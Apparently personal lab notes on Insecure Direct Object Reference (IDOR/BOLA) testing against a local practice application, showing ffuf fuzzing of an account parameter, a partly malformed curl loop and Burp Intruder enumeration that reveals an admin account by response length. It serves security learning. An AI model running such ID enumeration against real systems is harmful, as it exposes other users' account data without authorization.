<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>IDOR - Insecure Direct Object Reference</title>
</head><body>Essentially it's an access control issue where we can request a resouce with an object id and it returns some information of that object.<br/>
Examples of object id's are things like user ids, product IDs etc.<br/>
<br/>
And this vulnerablity is fairly trivial to find and exploit and we actually see a lot of API driven applications though in that situation we actually call it BOLA (i.e. broken objects level authorization.)<br/>
<br/>
So BOLA and IDOR are basically the same vulnerability.<br/>
<br/>
If we only the lab this is the output get:<br/>
<img height="391" src="image.png" width="400"/><br/>
<br/>
The easiest way to test for IDOR is essentially find a point where you're able to manipulate an object's ID and than simply change it.<br/>
<br/>
Will make a file name num.txt using python command from number 1 to 2001<br/>
python3 -c &quot;for i in range (1,2001): print(i)&quot; &gt; num.txt<br/>
<img height="456" src="image 2.png" width="500"/><br/>
<br/>
Now will simply pass the num.txt file through the URL using the FFUF and filter using size we get less entries as output which is good as earlier we were getting false positive.<br/>
ffuf -u &quot;http://localhost/labs/e0x02.php?account=FUZZ&quot; -w num.txt -fs 849 <br/>
<br/>
<img src="image 3.png"/><br/>
<br/>
What is we use grep we will get output in a more formated way<br/>
<img src="image 4.png"/><br/>
<br/>
I made the one lines script but it needs some if and else to get add in the output.<br/>
┌──(kali㉿kali)-[~/Downloads/labs/user-content]<br/>
└─$ for i in `cat $file`;do curl -v --silent http://localhost/labs/e0x02.php?account=&quot;$i&quot; 2&gt;&amp;1 | grep Type + echo &quot;$i&quot;&gt;&gt; put.txt;done; <br/>
<br/>
<img src="image 5.png"/><br/>
<br/>
Let's try with BurpSuite<br/>
Will load the num.txt as the payload in the intruder and attack will be sniper.<br/>
<img height="481" src="image 6.png" width="700"/><br/>
<br/>
Length 1131 is for No account information found<br/>
Length 1179 is for admin account<br/>
<br/>
<img height="506" src="image 7.png" width="650"/><br/>
<br/>
</body></html>